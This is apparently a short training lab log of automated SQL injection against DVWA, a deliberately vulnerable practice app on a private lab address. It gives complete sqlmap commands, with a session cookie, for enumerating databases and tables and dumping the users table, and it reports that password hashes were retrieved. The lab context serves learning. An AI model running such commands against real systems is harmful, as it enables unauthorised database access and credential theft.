# Day 8 – Automated SQL Injection Testing with sqlmap

## Target
- DVWA SQL Injection module URL: `http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`

## Tool
- sqlmap version: [your version]
- Used with `--batch` for automation.

## Commands Executed

```bash
# Banner grab
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=ee14a0fc65da267bc0c284af23452d03; security=low" --batch --banner

# Database enumeration
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=ee14a0fc65da267bc0c284af23452d03; security=low" --batch --dbs

# Table listing
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=ee14a0fc65da267bc0c284af23452d03; security=low" --batch -D dvwa --tables

# Dump data from users table
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=ee14a0fc65da267bc0c284af23452d03; security=low" --batch -D dvwa -T users --dump

Results
Banner: [Captured banner info]

Databases: dvwa, mysql, information_schema, ...

Tables in dvwa: users, guestbook, ...

Data from users table: usernames and password hashes retrieved.

Notes
sqlmap effectively automated data retrieval.

Cookie session and security level important for success.


